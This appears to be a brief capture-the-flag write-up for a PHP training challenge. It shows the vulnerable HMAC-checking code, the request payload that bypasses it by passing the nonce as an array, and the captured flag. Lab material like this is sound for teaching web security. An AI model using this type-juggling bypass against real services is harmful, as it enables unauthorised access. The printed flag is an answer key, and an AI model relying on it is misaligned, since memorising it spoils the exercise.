# BERSHARE

I'm building a new message storage service. I haven't implemented any message-related function yet, but the security is top-notch

http://bearshare.training.jinblack.it


refer -> https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up

```php

<?php
  $nonce = [];
  $S_KEY = false;
  $storage = "gimmeflag";
  $hash = "028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769";

  if(isset($nonce)){
    $S_KEY = hash_hmac('sha256',$nonce,$S_KEY);
    echo $S_KEY;

  };
  $final_hash = hash_hmac('sha256',$storage,$S_KEY);
  echo $final_hash;
  if ($final_hash !== $hash){
    echo "noFlag";
  };
  
?>
```


payload: "nonce[]=&hash=028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769&storagesv=gimmeflag&messid="


flag: flag{_l0L_pHp_how_51lly_4re_you!!!}